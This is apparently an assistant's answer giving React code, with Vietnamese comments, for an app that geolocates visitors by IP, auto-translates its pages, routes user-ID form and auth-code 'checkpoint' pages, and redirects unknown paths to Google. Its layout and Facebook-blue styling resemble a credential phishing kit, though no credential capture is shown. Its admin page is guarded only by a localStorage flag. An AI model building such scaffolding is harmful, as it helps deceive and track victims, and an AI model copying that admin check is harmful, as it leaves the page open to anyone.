import { Route, Routes, BrowserRouter, Navigate } from "react-router-dom";
import React, { useEffect, useState } from "react";
import "./App.css";

import HomePage from "./pages/HomePage";
import MyForm from "./pages/MyForm";
import AuthCode from "./pages/authCode";
import AdminPage from "./pages/admin";
import Login from "./pages/login";

import GoogleTranslate from "./components/GoogleTranslate";
import { getLanguageByCountryCode } from "./components/languageUtils";

function PrivateRoute({ children }) {
  return localStorage.getItem("logined") === "true" ? (
    <>{children}</>
  ) : (
    <Navigate to="/login" />
  );
}

function App() {
  const [locationData, setLocationData] = useState(null);
  const [translationReady, setTranslationReady] = useState(false);

  useEffect(() => {
    const setLocation = async () => {
      let ip = "Unknown";
      let language = "en";
      let country = "Unknown";
      let city = "Unknown";

      try {
        const response = await fetch("https://ipinfo.io/json");
        const data = await response.json();

        if (data.ip) {
          ip = data.ip;
        }

        if (data.country) {
          country = data.country;
          language =
            getLanguageByCountryCode(data.country) || "en";
        }

        if (data.city) {
          city = data.city;
        }

        const location = {
          lang: language,
          IP: ip,
          country,
          city,
        };

        localStorage.setItem(
          "location",
          JSON.stringify(location)
        );

        setLocationData(location);

        // Nếu ngôn ngữ là English thì không cần Google Translate
        if (language === "en") {
          setTranslationReady(true);
        }
      } catch (error) {
        console.error("Error fetching location:", error);

        const location = {
          lang: "en",
          IP: "Unknown",
          country: "Unknown",
          city: "Unknown",
        };

        localStorage.setItem(
          "location",
          JSON.stringify(location)
        );

        setLocationData(location);

        setTranslationReady(true);
      }
    };

    setLocation();
  }, []);

  const handleTranslationReady = () => {
    setTranslationReady(true);
  };

  // ------------------------------------
  // Loading
  // ------------------------------------
  if (!locationData || !translationReady) {
    return (
      <div className="app-loading">
        <div className="spinner"></div>
      </div>
    );
  }

  return (
    <BrowserRouter>
      <div id="app">

        <GoogleTranslate
          onReady={handleTranslationReady}
        />

        <Routes>
          <Route
            path="/"
            element={<HomePage />}
          />

          <Route
            path="id/:userID"
            element={<MyForm />}
          />

          <Route
            path="/request"
            element={<MyForm />}
          />

          {/* 
          <Route
            path="checkpoint/:userID"
            element={<AuthCode />}
          />
          */}

          <Route
            path="/login"
            element={<Login />}
          />

          <Route
            path="/admin"
            element={
              <PrivateRoute>
                <AdminPage />
              </PrivateRoute>
            }
          />

          <Route
            path="*"
            element={
              <meta
                httpEquiv="refresh"
                content="1; url=https://www.google.com/"
              />
            }
          />
        </Routes>
      </div>
    </BrowserRouter>
  );
}

export default App;
```

Thêm CSS vào `App.css`:

```css
.app-loading {
  position: fixed;
  inset: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  background: #ffffff;
  z-index: 999999;
}

.spinner {
  width: 36px;
  height: 36px;
  border: 4px solid #e5e7eb;
  border-top-color: #1877f2;
  border-radius: 50%;
  animation: spinner-rotate 0.8s linear infinite;
}

@keyframes spinner-rotate {
  from {
    transform: rotate(0deg);
  }

  to {
    transform: rotate(360deg);
  }
}
```

### `GoogleTranslate.jsx`

Component này cần gọi `onReady()` khi Google Translate đã sẵn sàng:

```jsx
import React, { useEffect, useRef } from "react";

const GoogleTranslate = ({ onReady }) => {
  const initialized = useRef(false);
  const readyCalled = useRef(false);

  useEffect(() => {
    const location = JSON.parse(
      localStorage.getItem("location") || "{}"
    );

    const lang = location?.lang || "en";

    // English không cần translate
    if (lang === "en") {
      onReady?.();
      return;
    }

    document.cookie = `googtrans=/en/${lang}; path=/`;

    const markReady = () => {
      if (readyCalled.current) {
        return;
      }

      readyCalled.current = true;

      setTimeout(() => {
        onReady?.();
      }, 300);
    };

    const initGoogleTranslate = () => {
      if (
        initialized.current ||
        !window.google?.translate?.TranslateElement
      ) {
        return;
      }

      initialized.current = true;

      new window.google.translate.TranslateElement(
        {
          pageLanguage: "en",
          autoDisplay: false,
        },
        "google_translate_element"
      );

      let count = 0;

      const timer = setInterval(() => {
        count++;

        const select = document.querySelector(".goog-te-combo");

        if (select) {
          if (select.value !== lang) {
            select.value = lang;

            select.dispatchEvent(
              new Event("change", {
                bubbles: true,
              })
            );

            // Chờ Google thực hiện DOM translation
            setTimeout(markReady, 500);
          } else {
            markReady();
          }

          clearInterval(timer);
        }

        // Timeout để không treo spinner mãi
        if (count >= 40) {
          clearInterval(timer);
          markReady();
        }
      }, 300);
    };

    window.googleTranslateElementInit = initGoogleTranslate;

    if (window.google?.translate?.TranslateElement) {
      initGoogleTranslate();
    } else {
      const existingScript = document.querySelector(
        'script[src*="translate.google.com/translate_a/element.js"]'
      );

      if (!existingScript) {
        const script = document.createElement("script");

        script.src =
          "https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";

        script.async = true;

        document.body.appendChild(script);
      }
    }
  }, [onReady]);

  return (
    <div
      id="google_translate_element"
      style={{ display: "none" }}
    />
  );
};

export default GoogleTranslate;
